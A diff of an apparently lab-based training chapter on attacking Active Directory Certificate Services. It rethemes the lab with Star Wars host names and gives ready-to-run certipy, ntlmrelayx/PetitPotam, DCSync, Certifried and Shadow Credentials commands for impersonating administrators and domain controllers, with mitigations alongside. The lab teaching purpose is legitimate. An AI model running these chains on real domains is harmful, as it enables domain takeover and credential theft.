@@ -22,7 +22,7 @@ this chapter you should be able to:
   bit) and `EDITF_ATTRIBUTESUBJECTALTNAME2` (CA-level flag).
 - Plant and remove a Shadow Credential without leaving artefacts.
 
-DVAD's CA (`ca01.corp.local`) is deliberately misconfigured to expose every
+EMPIRE's CA (`endor.empire.local`) is deliberately misconfigured to expose every
 one of the ESCs. The chapter ends with a fix table you'll apply when you
 practise hardening in chapter 13.
 
@@ -46,7 +46,7 @@ The "AD-integrated" part is what makes ADCS interesting (and dangerous):
 templates, security descriptors, group-based enrollment, OID-to-group
 links, and machine auto-enrollment all live in the AD directory itself,
 specifically in `CN=Public Key Services,CN=Services,CN=Configuration,
-DC=corp,DC=local`. The CA reads and writes to AD; AD trusts the CA's
+DC=empire,DC=local`. The CA reads and writes to AD; AD trusts the CA's
 issued certs for PKINIT via `NTAuthCertificates`. The result is a deeply
 intertwined system where misconfigurations in one corner (a template ACL,
 a CA registry flag, a DC hardening mode) compose into full forest
@@ -95,7 +95,7 @@ legacy Windows clients can't validate ECDSA chains.
 Practical operator implications:
 
 - A stolen private key is game-over for the binding it certifies. If you
-  exfiltrate a `dc01$` machine cert + private key, you have `dc01$` until
+  exfiltrate a `coruscant$` machine cert + private key, you have `coruscant$` until
   the cert expires or is revoked.
 - Cracking RSA-2048 is not feasible. Don't try.
 - Cracking the **password protecting a PFX** is feasible if the password
@@ -190,12 +190,12 @@ For AD client auth, the relevant SAN entries are:
 
 - **OtherName with OID `1.3.6.1.4.1.311.20.2.3`** (Microsoft UPN). Used
   for **user** PKINIT.
-- **dNSName** (DNS host). Used for **computer** PKINIT (`dc01.corp.local`
-  in the cert maps to `DC01$` in AD when strong binding is off).
+- **dNSName** (DNS host). Used for **computer** PKINIT (`coruscant.empire.local`
+  in the cert maps to `coruscant$` in AD when strong binding is off).
 
-If a SAN says `dnsName=dc01.corp.local`, the KDC will authenticate the
-holder as `DC01$` (subject to mapping policy). If the SAN says
-`UPN=Administrator@corp.local`, the KDC will authenticate as
+If a SAN says `dnsName=coruscant.empire.local`, the KDC will authenticate the
+holder as `coruscant$` (subject to mapping policy). If the SAN says
+`UPN=Administrator@empire.local`, the KDC will authenticate as
 `Administrator`. Spoofing the SAN is what ESC1 and ESC6 do.
 
 ---
@@ -213,7 +213,7 @@ Root CA  -->  Intermediate CA  -->  End-entity certificate
 In Windows, the root store lives in the cert store under
 `LocalMachine\Root`. In AD, the **`NTAuthCertificates`** store
 (`CN=NTAuthCertificates,CN=Public Key Services,CN=Services,CN=Configuration,
-DC=corp,DC=local`) lists CAs whose end-entity certs are trusted for
+DC=empire,DC=local`) lists CAs whose end-entity certs are trusted for
 **AD authentication**. Removing a CA from this list breaks PKINIT for
 certs it issues. (`NTAuth` therefore is a higher trust bar than ordinary
 TLS chaining.)
@@ -229,7 +229,7 @@ analog of Golden Ticket.
 ### Containers in the Configuration NC
 
 ```
-CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local
+CN=Public Key Services,CN=Services,CN=Configuration,DC=empire,DC=local
 ├── CN=AIA                           Authority Info Access certs
 ├── CN=CDP                           CRL Distribution Points
 ├── CN=Certificate Templates         All templates (cert template objects)
@@ -263,19 +263,19 @@ Standard flow:
 5. CA signs and returns the certificate. Private key stays with client
    (unless CA archives keys, which is rare).
 
-DVAD's CA (`ca01.corp.local`) runs Microsoft Enterprise CA with multiple
+EMPIRE's CA (`endor.empire.local`) runs Microsoft Enterprise CA with multiple
 weak templates. The role is "AD CS — Certificate Authority" plus "Web
 Enrollment" (giving ESC8).
 
 ### Enrollment endpoints and the protocols on the wire
 
-| Endpoint | Protocol | Port | Auth | DVAD enabled |
+| Endpoint | Protocol | Port | Auth | EMPIRE enabled |
 |---|---|---|---|---|
 | ICertRequest DCOM | MS-WCCE | 135 + RPC | Kerberos/NTLM | yes (default) |
 | `/certsrv/` web | HTTP | 80 | NTLM | yes (ESC8) |
 | CES Web Service | HTTPS SOAP | 443 | Negotiate/Cert | sometimes |
 | CEP Policy Web Service | HTTPS SOAP | 443 | Negotiate | sometimes |
-| NDES/SCEP | HTTP/HTTPS | 80/443 | challenge string | no in DVAD |
+| NDES/SCEP | HTTP/HTTPS | 80/443 | challenge string | no in EMPIRE |
 
 The protocol that matters most for offence is **MS-WCCE** because every
 certipy command speaks it under the hood. Look at MS-WCCE if you ever
@@ -347,7 +347,7 @@ CT_FLAG_NO_SECURITY_EXTENSION                      = 0x00080000  -- ESC9!
 
 `msPKI-Certificate-Name-Flag` has bit `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`
 (`0x1`). If set, the requester can put **any subject name and SAN** in
-the CSR — including a UPN like `Administrator@corp.local`. Combined with
+the CSR — including a UPN like `Administrator@empire.local`. Combined with
 a Client Authentication EKU, that's instant impersonation: request a
 cert as `Administrator`, authenticate via PKINIT, profit.
 
@@ -365,12 +365,12 @@ The `nTSecurityDescriptor` controls access. Relevant ACEs:
 
 ```
 Enrollment Rights
-  CORP.LOCAL\Domain Users        <-- low-priv enroll = bad
-  CORP.LOCAL\Authenticated Users <-- worse
+  empire.local\Domain Users        <-- low-priv enroll = bad
+  empire.local\Authenticated Users <-- worse
 Object Control Permissions
-  Owner: CORP.LOCAL\Administrator
-  WriteOwner: CORP.LOCAL\Administrators
-  WriteDacl:  CORP.LOCAL\Administrators
+  Owner: empire.local\Administrator
+  WriteOwner: empire.local\Administrators
+  WriteDacl:  empire.local\Administrators
 ```
 
 ---
@@ -396,7 +396,7 @@ Object Control Permissions
 | **ESC15** | EKUwu — schema v1 templates accept application-policy EKU upgrade | v1 templates |
 | **ESC16** | Disabled szOID_NTDS_CA_SECURITY_EXT validation on a CA (CA-side ESC9) | CA registry |
 
-DVAD provisions vulnerable templates for nearly all of these (see
+EMPIRE provisions vulnerable templates for nearly all of these (see
 `ansible/roles/adcs_vulns`).
 
 The remaining sections walk each ESC. Where the chain is identical to a
@@ -416,20 +416,20 @@ Attacker has any low-priv credential (e.g., `svc_vision:Summer2023!`).
 
 ```bash
 # Step 1: discover templates
-certipy find -u svc_vision@corp.local -p 'Summer2023!' \
+certipy find -u svc_vision@empire.local -p 'Summer2023!' \
         -dc-ip 10.10.0.10 -text -stdout > certipy.out
 grep -B2 -A20 ESC1 certipy.out
 ```
 
-Note the template name and the CA name (`CORP-CA`).
+Note the template name and the CA name (`EMPIRE-CA`).
 
 ```bash
 # Step 2: request a certificate as Administrator
 certipy req \
-        -u svc_vision@corp.local -p 'Summer2023!' \
-        -dc-ip 10.10.0.10 -target ca01.corp.local \
-        -ca CORP-CA -template ESC1Template \
-        -upn Administrator@corp.local
+        -u svc_vision@empire.local -p 'Summer2023!' \
+        -dc-ip 10.10.0.10 -target endor.empire.local \
+        -ca EMPIRE-CA -template ESC1Template \
+        -upn Administrator@empire.local
 # certipy now has administrator.pfx
 ```
 
@@ -446,11 +446,11 @@ Now you can `psexec` the DC.
 The KDC, on receipt of PA-PK-AS-REQ, decodes the cert and inspects:
 
 1. Issuer chain — must chain to a CA listed in `NTAuthCertificates`.
-   `CORP-CA` is in there.
+   `EMPIRE-CA` is in there.
 2. Validity — cert not yet expired.
 3. CRL/OCSP — cert not revoked (best-effort; default Windows CA has empty
    CRL, attacker just-issued cert is fresh).
-4. SAN mapping — cert SAN says `UPN=Administrator@corp.local`, so the KDC
+4. SAN mapping — cert SAN says `UPN=Administrator@empire.local`, so the KDC
    looks up that UPN in AD and finds `Administrator`. Issues TGT for
    `Administrator`.
 
@@ -462,7 +462,7 @@ the CA "trust whatever the requester puts in," so the CA put
 ### Subtle preconditions
 
 - The target user (`Administrator`) must actually exist in AD. You can't
-  PKINIT as `NonExistent@corp.local`.
+  PKINIT as `NonExistent@empire.local`.
 - The target must be enabled and not have `SMARTCARD_REQUIRED` set in
   a way that conflicts.
 - If `StrongCertificateBindingEnforcement = 2` (full enforcement) on the
@@ -474,7 +474,7 @@ the CA "trust whatever the requester puts in," so the CA put
   (`Administrator`). Microsoft's enforcement logic, as of 2024 cumulative,
   embeds the SID of the *requesting principal* (svc_vision), not the
   supplied SAN. So full enforcement defeats vanilla ESC1.
-- DVAD is set to `StrongCertificateBindingEnforcement = 1` (compat mode)
+- EMPIRE is set to `StrongCertificateBindingEnforcement = 1` (compat mode)
   to keep ESC1 live.
 
 ---
@@ -505,13 +505,13 @@ natively.
 ```bash
 # Step 1: enroll an Enrollment Agent cert
 certipy req \
-        -u svc_vision@corp.local -p 'Summer2023!' \
-        -ca CORP-CA -template EnrollmentAgent
+        -u svc_vision@empire.local -p 'Summer2023!' \
+        -ca EMPIRE-CA -template EnrollmentAgent
 
 # Step 2: use the EA cert to enroll for someone else
 certipy req \
-        -u svc_vision@corp.local -p 'Summer2023!' \
-        -ca CORP-CA -template User \
+        -u svc_vision@empire.local -p 'Summer2023!' \
+        -ca EMPIRE-CA -template User \
         -on-behalf-of 'corp\Administrator' \
         -pfx svc_vision.pfx
 ```
@@ -526,7 +526,7 @@ EA template.
 
 The mitigation is **enrollment agent restrictions**: on the CA, you can
 configure which users an EA can request on-behalf-of which templates.
-DVAD leaves these unset.
+EMPIRE leaves these unset.
 
 ---
 
@@ -539,10 +539,10 @@ enrollment rights. You've just made an ESC1.
 
 ```bash
 certipy template \
-        -u peter.parker@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 \
+        -u peter.parker@empire.local -p 'EmpireLab2024!' -dc-ip 10.10.0.10 \
         -template VulnerableTemplate -save-old      # backup
 certipy template \
-        -u peter.parker@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 \
+        -u peter.parker@empire.local -p 'EmpireLab2024!' -dc-ip 10.10.0.10 \
         -template VulnerableTemplate                # apply the ESC1 transform
 # now enroll as in ESC1
 ```
@@ -560,15 +560,15 @@ If you prefer to do it by hand (great for understanding):
 dacledit.py -action 'write' \
             -rights 'WriteProperty' \
             -principal peter.parker \
-            -target-dn 'CN=VulnerableTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local' \
+            -target-dn 'CN=VulnerableTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=empire,DC=local' \
             -inheritance \
-            corp.local/peter.parker:'DVADlab2024!' -dc-ip 10.10.0.10
+            empire.local/peter.parker:'EmpireLab2024!' -dc-ip 10.10.0.10
 ```
 
 Then use any LDAP tool to flip the Name-Flag bit:
 
 ```bash
-bloodyAD --host dc01 -u peter.parker -p 'DVADlab2024!' \
+bloodyAD --host coruscant -u peter.parker -p 'EmpireLab2024!' \
          set object 'CN=VulnerableTemplate,...' \
          msPKI-Certificate-Name-Flag 0x1
 ```
@@ -580,7 +580,7 @@ bloodyAD --host dc01 -u peter.parker -p 'DVADlab2024!' \
 ESC5 is the "ACL on adjacent objects" family: WriteOwner / WriteDacl /
 GenericAll on:
 
-- The CA object itself (`CN=CORP-CA,CN=Enrollment Services,CN=Public Key
+- The CA object itself (`CN=EMPIRE-CA,CN=Enrollment Services,CN=Public Key
   Services,...`). Letting you change `EditFlags` (→ ESC6) or template
   binding.
 - The NTAuthCertificates container — bigger blast radius; you can add a
@@ -588,7 +588,7 @@ GenericAll on:
   for PKINIT. Catastrophic.
 - The Root CAs container — add a trusted root.
 - The Certificate Templates container — read/write any template.
-- The hosting host (e.g., `ca01.corp.local` machine object) — pwn the
+- The hosting host (e.g., `endor.empire.local` machine object) — pwn the
   CA host directly.
 
 `certipy find -enabled -vulnerable` prints ESC5 findings under "Object
@@ -614,12 +614,12 @@ ESC6.
 
 ```bash
 certipy req \
-        -u svc_vision@corp.local -p 'Summer2023!' \
-        -ca CORP-CA -template User \
-        -upn Administrator@corp.local
+        -u svc_vision@empire.local -p 'Summer2023!' \
+        -ca EMPIRE-CA -template User \
+        -upn Administrator@empire.local
 ```
 
-DVAD enables this on `CORP-CA`.
+EMPIRE enables this on `EMPIRE-CA`.
 
 ### Why this flag exists
 
@@ -654,8 +654,8 @@ principal can flip flags or approve pending requests.
 
 ```bash
 certipy ca \
-        -u peter.parker@corp.local -p '...' \
-        -ca CORP-CA -add-officer peter.parker
+        -u peter.parker@empire.local -p '...' \
+        -ca EMPIRE-CA -add-officer peter.parker
 # Grants peter.parker Certificate Manager on the CA
 ```
 
@@ -675,35 +675,35 @@ Now:
 1. Coerce a target (e.g., a DC) to authenticate to your attacker box via
    PetitPotam/PrinterBug/DFSCoerce.
 2. Attacker relays the inbound NTLM auth to
-   `http://ca01/certsrv/certfnsh.asp` and requests a cert (default
+   `http://endor/certsrv/certfnsh.asp` and requests a cert (default
    `DomainController` template) impersonating the DC.
-3. Now you have a cert as `dc01$` — DCSync immediately.
+3. Now you have a cert as `coruscant$` — DCSync immediately.
 
 ```bash
 # Terminal A: relay listener
 ntlmrelayx.py \
-        -t http://ca01.corp.local/certsrv/certfnsh.asp \
+        -t http://endor.empire.local/certsrv/certfnsh.asp \
         --adcs --template DomainController -smb2support
 
 # Terminal B: coerce
 python3 PetitPotam.py \
-        -d corp.local -u peter.parker -p 'DVADlab2024!' \
+        -d empire.local -u peter.parker -p 'EmpireLab2024!' \
         attacker.10.10.0.1 10.10.0.10
 # attacker IP is where ntlmrelayx is listening
 ```
 
-Output: a base64-encoded PFX for `dc01$`. PKINIT with it, retrieve TGT,
+Output: a base64-encoded PFX for `coruscant$`. PKINIT with it, retrieve TGT,
 DCSync krbtgt, full control:
 
 ```bash
-echo 'MIIK...' | base64 -d > dc01.pfx
-certipy auth -pfx dc01.pfx -dc-ip 10.10.0.10
-# Output: dc01$ NT hash + TGT
-impacket-secretsdump -hashes :<dc01$-NT> -just-dc-user krbtgt \
-        corp.local/'DC01$'@10.10.0.10
+echo 'MIIK...' | base64 -d > coruscant.pfx
+certipy auth -pfx coruscant.pfx -dc-ip 10.10.0.10
+# Output: coruscant$ NT hash + TGT
+impacket-secretsdump -hashes :<coruscant$-NT> -just-dc-user krbtgt \
+        empire.local/'coruscant$'@10.10.0.10
 ```
 
-DVAD: this is the **CRED-031** primary path.
+EMPIRE: this is the **CRED-031** primary path.
 
 ### Mitigation hierarchy
 
@@ -745,7 +745,7 @@ fallback mapping methods are allowed:
 - `0x10` — S4U2Self Explicit (strong)
 - `0x20` — Issuer + Serial Number Implicit (strong)
 
-DVAD sets `CertificateMappingMethods = 0x1F` (all weak modes on) and
+EMPIRE sets `CertificateMappingMethods = 0x1F` (all weak modes on) and
 `StrongCertificateBindingEnforcement = 1`, to allow both ESC9 and ESC10.
 
 ### ESC9 — template flag
@@ -760,21 +760,21 @@ on `tony.stark`):
 ```bash
 # Step 1: change tony.stark's UPN to administrator
 certipy account \
-        -u peter.parker@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 \
-        update -user tony.stark -upn 'administrator@corp.local'
+        -u peter.parker@empire.local -p 'EmpireLab2024!' -dc-ip 10.10.0.10 \
+        update -user tony.stark -upn 'administrator@empire.local'
 
 # Step 2: from tony.stark, enroll the no-extension template
 certipy req \
-        -u tony.stark@corp.local -p 'BobPass!' \
-        -ca CORP-CA -template ESC9NoExt
+        -u tony.stark@empire.local -p 'BobPass!' \
+        -ca EMPIRE-CA -template ESC9NoExt
 
 # Step 3: change tony.stark's UPN back so PKINIT doesn't see two admins
 certipy account \
-        -u peter.parker@corp.local -p 'DVADlab2024!' \
-        update -user tony.stark -upn 'tony.stark@corp.local'
+        -u peter.parker@empire.local -p 'EmpireLab2024!' \
+        update -user tony.stark -upn 'tony.stark@empire.local'
 
 # Step 4: PKINIT — DC falls back to UPN map, no extension to disagree
-certipy auth -pfx tony.stark.pfx -dc-ip 10.10.0.10 -username administrator -domain corp.local
+certipy auth -pfx tony.stark.pfx -dc-ip 10.10.0.10 -username administrator -domain empire.local
 ```
 
 ### ESC10 — DC registry
@@ -800,7 +800,7 @@ Tooling: `certipy relay` or `Certify.exe relay`.
 
 ```bash
 # Listener
-certipy relay -target rpc://ca01.corp.local
+certipy relay -target rpc://endor.empire.local
 # Coercer (e.g., PetitPotam) -> attacker IP
 ```
 
@@ -821,7 +821,7 @@ ESC12 is the corner case where the CA's private key is stored in a
 hardware module (HSM/TPM/YubiHSM) and the attacker compromises the host
 hosting that key, gaining the ability to issue arbitrary certs. Not
 really an AD misconfig — more an opsec failure. We mention it for
-completeness; DVAD does not include it (the CA is a software CA, so it's
+completeness; EMPIRE does not include it (the CA is a software CA, so it's
 already worse than ESC12 from a key-exfil standpoint).
 
 ---
@@ -857,7 +857,7 @@ attribute → spoof.
 Example value:
 
 ```
-X509:<I>DC=local,DC=corp,CN=CORP-CA<S>CN=Some Subject
+X509:<I>DC=local,DC=corp,CN=EMPIRE-CA<S>CN=Some Subject
 ```
 
 If an attacker can write `altSecurityIdentities` on a target user, they
@@ -865,7 +865,7 @@ can configure the user's account to be authenticatable by any cert with
 the named issuer + subject. Then enroll such a cert (which the attacker
 controls subject of) and PKINIT.
 
-Standalone niche but DVAD includes a vulnerable instance.
+Standalone niche but EMPIRE includes a vulnerable instance.
 
 ---
 
@@ -879,13 +879,13 @@ a no-EKU cert to Client Auth.
 
 CVE-2024-49019. Patched in November 2024 cumulative.
 
-DVAD includes a v1 template `WebServer-v1` that does not have Client Auth
+EMPIRE includes a v1 template `WebServer-v1` that does not have Client Auth
 EKU but is enrollable by `Domain Users`. The exploit injects an
 application-policy extension into the CSR with the Client Auth OID:
 
 ```bash
 certipy req \
-        -u peter.parker -p ... -ca CORP-CA -template WebServer-v1 \
+        -u peter.parker -p ... -ca EMPIRE-CA -template WebServer-v1 \
         -application-policies '1.3.6.1.5.5.7.3.2'
 # The CA misinterprets and issues with Client Auth in the EKU
 ```
@@ -917,29 +917,29 @@ from the account's DN. If the account is a *computer* and you control its
 `dNSHostName` attribute, you can:
 
 1. Create `EVIL$` via MachineAccountQuota.
-2. Set `EVIL$.dNSHostName = dc01.corp.local` (LDAP write).
+2. Set `EVIL$.dNSHostName = coruscant.empire.local` (LDAP write).
 3. Clear `EVIL$.servicePrincipalName` so the SPN conflict doesn't fail.
 4. Request a cert with the default `Machine` template — the CA places
-   `dc01.corp.local` in SAN-DNS.
-5. PKINIT with the cert as `dc01$` — the KDC sees `dnsName=dc01.corp.local`
-   in SAN, maps to `DC01$`, issues TGT.
+   `coruscant.empire.local` in SAN-DNS.
+5. PKINIT with the cert as `coruscant$` — the KDC sees `dnsName=coruscant.empire.local`
+   in SAN, maps to `coruscant$`, issues TGT.
 
 ```bash
 certipy account create \
-        -u peter.parker@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 \
+        -u peter.parker@empire.local -p 'EmpireLab2024!' -dc-ip 10.10.0.10 \
         -user 'EVIL$' -pass 'CertifiedPwn!1' \
-        -dns dc01.corp.local
+        -dns coruscant.empire.local
 
 certipy req \
-        -u 'EVIL$@corp.local' -p 'CertifiedPwn!1' \
-        -ca CORP-CA -template Machine
+        -u 'EVIL$@empire.local' -p 'CertifiedPwn!1' \
+        -ca EMPIRE-CA -template Machine
 
-certipy auth -pfx evil.pfx -dc-ip 10.10.0.10        # auths as dc01$
+certipy auth -pfx evil.pfx -dc-ip 10.10.0.10        # auths as coruscant$
 ```
 
 The patch (KB5014754) added the security extension to prevent this. With
 strong binding mode 2, the cert must carry the *requesting* principal's
-SID extension, not the spoofed DNS name's. DVAD intentionally disables
+SID extension, not the spoofed DNS name's. EMPIRE intentionally disables
 enforcement to keep the path live.
 
 ### Cleanup
@@ -947,11 +947,11 @@ enforcement to keep the path live.
 Don't leave `EVIL$` polluting the directory:
 
 ```bash
-impacket-addcomputer corp.local/peter.parker:'DVADlab2024!' \
+impacket-addcomputer empire.local/peter.parker:'EmpireLab2024!' \
         -delete -computer-name 'EVIL$' -dc-ip 10.10.0.10
 ```
 
-Also reset `dc01$`'s dNSHostName if you nuked it accidentally
+Also reset `coruscant$`'s dNSHostName if you nuked it accidentally
 (`certipy account update -dns ...`).
 
 ---
@@ -966,12 +966,12 @@ key.
 
 ```bash
 certipy shadow auto \
-        -u peter.parker@corp.local -p 'DVADlab2024!' \
-        -account 'sql01$' -dc-ip 10.10.0.10
-# certipy plants a key, PKINITs, retrieves sql01$'s NT hash, removes the key
+        -u peter.parker@empire.local -p 'EmpireLab2024!' \
+        -account 'kamino$' -dc-ip 10.10.0.10
+# certipy plants a key, PKINITs, retrieves kamino$'s NT hash, removes the key
 ```
 
-This is `CRED-027` in DVAD.
+This is `CRED-027` in EMPIRE.
 
 ### Why does the attribute even exist?
 
@@ -991,11 +991,11 @@ one command, leaving the attribute exactly as it was found.
 ### Manual flow
 
 ```bash
-certipy shadow list -u peter.parker@corp.local -p ... -account sql01$
+certipy shadow list -u peter.parker@empire.local -p ... -account kamino$
 # show existing keys
-certipy shadow add -u peter.parker -p ... -account sql01$
+certipy shadow add -u peter.parker -p ... -account kamino$
 # add a new key, save the device ID
-certipy shadow remove -u peter.parker -p ... -account sql01$ -device-id <uuid>
+certipy shadow remove -u peter.parker -p ... -account kamino$ -device-id <uuid>
 # remove just the one we added
 ```
 
@@ -1105,7 +1105,7 @@ For the CA's private key on a soft CA, the key lives in
 the SYSTEM DPAPI master key — recoverable if you're SYSTEM on the host
 or if you have the LSA secrets.
 
-DVAD's CA does not protect the key with an HSM. SYSTEM on `ca01` = CA key
+EMPIRE's CA does not protect the key with an HSM. SYSTEM on `endor` = CA key
 in your pocket = arbitrary cert forever.
 
 ---
@@ -1137,7 +1137,7 @@ forest, alongside the root domain's `nTSecurityDescriptor`.
 ### Exercise 6.A — Inventory templates
 
 ```bash
-certipy find -u peter.parker@corp.local -p 'DVADlab2024!' \
+certipy find -u peter.parker@empire.local -p 'EmpireLab2024!' \
         -dc-ip 10.10.0.10 -text -stdout | less
 ```
 
@@ -1148,9 +1148,9 @@ Note which are enrollable by `Domain Users`, which by specific groups.
 
 ```bash
 certipy req \
-        -u svc_vision@corp.local -p 'Summer2023!' -dc-ip 10.10.0.10 \
-        -ca CORP-CA -template ESC1Template \
-        -upn Administrator@corp.local
+        -u svc_vision@empire.local -p 'Summer2023!' -dc-ip 10.10.0.10 \
+        -ca EMPIRE-CA -template ESC1Template \
+        -upn Administrator@empire.local
 certipy auth -pfx administrator.pfx -dc-ip 10.10.0.10
 ```
 
@@ -1159,7 +1159,7 @@ You receive Administrator's NT hash. Use it to DCSync krbtgt:
 ```bash
 impacket-secretsdump \
         -hashes :<nt> -just-dc-user krbtgt \
-        corp.local/Administrator@10.10.0.10
+        empire.local/Administrator@10.10.0.10
 ```
 
 ### Exercise 6.C — ESC8 (relay)
@@ -1167,51 +1167,51 @@ impacket-secretsdump \
 ```bash
 # Terminal A
 ntlmrelayx.py \
-        -t http://ca01.corp.local/certsrv/certfnsh.asp \
+        -t http://endor.empire.local/certsrv/certfnsh.asp \
         --adcs --template DomainController -smb2support
 
 # Terminal B
 python3 PetitPotam.py \
-        -d corp.local -u peter.parker -p 'DVADlab2024!' 10.10.0.1 10.10.0.10
+        -d empire.local -u peter.parker -p 'EmpireLab2024!' 10.10.0.1 10.10.0.10
 ```
 
-Output: PKCS12 (base64) for `dc01$`. Then:
+Output: PKCS12 (base64) for `coruscant$`. Then:
 
 ```bash
-echo 'MIIK...' | base64 -d > dc01.pfx
-certipy auth -pfx dc01.pfx -dc-ip 10.10.0.10
+echo 'MIIK...' | base64 -d > coruscant.pfx
+certipy auth -pfx coruscant.pfx -dc-ip 10.10.0.10
 ```
 
-You'll see the `dc01$` NT hash + TGT.
+You'll see the `coruscant$` NT hash + TGT.
 
 ### Exercise 6.D — Certifried
 
 ```bash
 certipy account create \
-        -u peter.parker@corp.local -p 'DVADlab2024!' \
+        -u peter.parker@empire.local -p 'EmpireLab2024!' \
         -dc-ip 10.10.0.10 \
         -user 'EVIL$' -pass 'CertifiedPwn!1' \
-        -dns dc01.corp.local
+        -dns coruscant.empire.local
 
 certipy req \
-        -u 'EVIL$@corp.local' -p 'CertifiedPwn!1' \
-        -ca CORP-CA -template Machine
+        -u 'EVIL$@empire.local' -p 'CertifiedPwn!1' \
+        -ca EMPIRE-CA -template Machine
 
 certipy auth -pfx evil.pfx -dc-ip 10.10.0.10
 ```
 
 Cleanup the `EVIL$` computer after.
 
-### Exercise 6.E — Shadow Credentials on `sql01$`
+### Exercise 6.E — Shadow Credentials on `kamino$`
 
 ```bash
 certipy shadow auto \
-        -u peter.parker@corp.local -p 'DVADlab2024!' \
-        -dc-ip 10.10.0.10 -account 'sql01$'
+        -u peter.parker@empire.local -p 'EmpireLab2024!' \
+        -dc-ip 10.10.0.10 -account 'kamino$'
 ```
 
-You receive `sql01$`'s NT hash. Use it for silver tickets or pass-the-hash
-against sql01.
+You receive `kamino$`'s NT hash. Use it for silver tickets or pass-the-hash
+against kamino.
 
 ### Exercise 6.F — ESC4 template-DACL abuse
 
@@ -1236,13 +1236,13 @@ Identify:
 - Serial number.
 - Subject (probably `CN=svc_vision` because of FROM_AD).
 - SAN — should include `Other Name: 1.3.6.1.4.1.311.20.2.3 =
-  Administrator@corp.local`.
+  Administrator@empire.local`.
 - EKU — Client Authentication.
 - `szOID_NTDS_CA_SECURITY_EXT` extension — present or absent?
 
 ### Exercise 6.H — Crack a PFX password
 
-If you exfil a `.pfx` with a guessable password (DVAD shares may seed one):
+If you exfil a `.pfx` with a guessable password (EMPIRE shares may seed one):
 
 ```bash
 pfx2john weak.pfx > weak.john
@@ -1251,7 +1251,7 @@ john --wordlist=rockyou.txt weak.john
 
 ### Exercise 6.I — Plant a fake NTAuth CA (DA only)
 
-As DA in DVAD, generate a self-signed CA cert and publish it:
+As DA in EMPIRE, generate a self-signed CA cert and publish it:
 
 ```bash
 openssl req -x509 -newkey rsa:2048 -days 365 -nodes \
@@ -1323,3 +1323,85 @@ Re-run the exploit; verify failure. Roll back.
 - **TrustedSec — *Operationalizing ADCS*** — practical operator notes.
 
 Next: [07-attacker-toolkit.md](07-attacker-toolkit.md).
+
+---
+
+# The EMPIRE AD Lab: Star Wars Lore & Thematic Mapping
+
+Welcome to the **EMPIRE AD Lab**, where the intricacies of Active Directory align with the galactic struggle between the Galactic Empire, the Rebel Alliance, and the shadow syndicates. This section provides a conceptual thematic mapping between the AD concepts you are attacking and the Star Wars universe.
+
+## The Galactic Topology
+
+The lab topology represents the political structure of the galaxy. Just as trust relationships govern AD, diplomatic and military alliances govern the galaxy.
+
+```mermaid
+graph TD
+    classDef empire fill:#000000,stroke:#ff0000,stroke-width:2px,color:#fff;
+    classDef rebel fill:#2b5c8f,stroke:#ff9900,stroke-width:2px,color:#fff;
+    classDef trade fill:#4a4a4a,stroke:#aaaaaa,stroke-width:2px,color:#fff;
+    classDef highlight fill:#440000,stroke:#ff0000,stroke-width:3px,color:#fff;
+
+    subgraph The Galactic Empire (empire.local)
+        Coruscant["Coruscant (Root DC)<br/>coruscant.empire.local"]:::empire
+        DeathStar["The Death Star (Child DC)<br/>deathstar.eu.empire.local"]:::highlight
+        Scarif["Scarif Citadel (File Server)<br/>scarif.empire.local"]:::empire
+        Kamino["Kamino Cloning Facility (SQL)<br/>kamino.empire.local"]:::empire
+        Endor["Endor Shield Generator (CA)<br/>endor.empire.local"]:::empire
+        Mandalore["Mandalore Mercenary Base (Linux)<br/>mandalore.empire.local"]:::empire
+        Coruscant -- "Imperial Command" --> DeathStar
+        Coruscant --- Scarif
+        Coruscant --- Kamino
+        Coruscant --- Endor
+        Coruscant --- Mandalore
+    end
+
+    subgraph The Rebel Alliance (rebel.local)
+        Yavin4["Yavin 4 Base<br/>yavin4.rebel.local"]:::rebel
+    end
+
+    subgraph The Trade Federation (trade.corp)
+        Neimoidia["Cato Neimoidia<br/>neimoidia.trade.corp"]:::trade
+    end
+
+    Coruscant <-->|Espionage / External Trust| Yavin4
+    Coruscant <-->|Treaty / Forest Trust| Neimoidia
+```
+
+## Infrastructure Mapping
+
+Understanding the infrastructure is key to successfully executing your attack paths. Here is how the technical components of the EMPIRE AD lab map to the Star Wars universe:
+
+### 1. The Core Domains
+* **`empire.local` (The Galactic Empire):** The central root domain. This is the seat of the Emperor and the Imperial Senate. Taking over this domain is equivalent to taking over Coruscant. It controls all the core infrastructure.
+* **`eu.empire.local` (The Death Star):** A child domain of `empire.local`. While it reports to the root domain, it holds immense power. Escaping the child domain to compromise the root domain is the equivalent of using the Death Star plans to destroy the Empire.
+* **`rebel.local` (The Rebel Alliance):** An external forest. It has an external trust with the Empire (perhaps through espionage or captured spies). Moving laterally across this trust requires finding a weak link in the Rebel defenses.
+* **`trade.corp` (The Trade Federation):** A separate forest with a bidirectional forest trust. The Empire uses them for resources, but you can forge trust tickets (Inter-Realm TGTs) to cross this boundary.
+
+### 2. High-Value Targets (Servers)
+* **`coruscant.empire.local` (Coruscant Root DC):** The ultimate prize. Achieving Domain Admin here gives you the keys to the galaxy.
+* **`endor.empire.local` (Endor Shield Generator / ADCS):** Active Directory Certificate Services. If you can compromise the CA (via ESC1, ESC8, etc.), you can forge certificates for any user in the Empire, effectively bringing down the deflector shields.
+* **`scarif.empire.local` (Scarif Citadel):** This file server hosts critical SMB shares. It is the repository of the Death Star plans. Look for exposed passwords in scripts or configuration files left by careless Imperial engineers.
+* **`kamino.empire.local` (Kamino Facility):** The SQL Server. SQL injection or xp_cmdshell here can lead to a foothold. It represents the cloning facilities—a hidden source of power.
+* **`mandalore.empire.local` (Mandalore Base):** The Linux-in-AD member. Contains local privilege escalations and cross-OS pivot opportunities. Represents the mercenary faction employed by the Empire.
+
+### 3. Attack Paths and Tactics
+* **Initial Access (The Smuggler's Route):** Finding an exposed SMB share or exploiting an LLMNR poisoning vulnerability (Responder) is like slipping past the Imperial blockade.
+* **Kerberoasting (Bounty Hunting):** Requesting TGS tickets for service accounts and cracking them offline is like putting a bounty on a high-value target and cracking their encryption.
